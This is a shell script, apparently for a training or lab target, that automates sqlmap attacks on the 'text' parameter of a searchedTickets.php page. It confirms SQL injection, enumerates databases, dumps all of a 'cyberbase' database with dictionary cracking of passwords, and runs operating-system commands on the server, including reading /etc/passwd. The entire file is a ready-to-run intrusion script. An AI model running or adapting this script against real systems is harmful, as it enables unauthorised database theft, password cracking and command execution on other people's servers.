#!/bin/sh

HOST="$1"
if [ -z "$HOST" ]; then
    echo "Usage: $0 <HOST>"
    echo "Specify the host without http:// and without path - only the address or IP"
    exit 1
fi

# Use Sqlmap to check for SQL Injection
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch
sleep 1

# List available databases
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --dbs
sleep 1

# Show the schema of the "cyberbase" database
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch -D cyberbase --schema
sleep 1

# Dump all contents of the cyberbase DB. Passwords are also cracked with a dictionary attack
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch -D cyberbase --dump-all
sleep 1

# Get a shell on the operating system
# Cannot do it non-interactively!
#sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-shell

# Run some commands on the operating system
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "whoami"
sleep 1
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "id"
sleep 1
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "uname -a"
sleep 1
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "ls"
sleep 1
sqlmap -u "http://$HOST/searchedTickets.php?text=a" --batch --os-cmd "cat /etc/passwd"
sleep 1
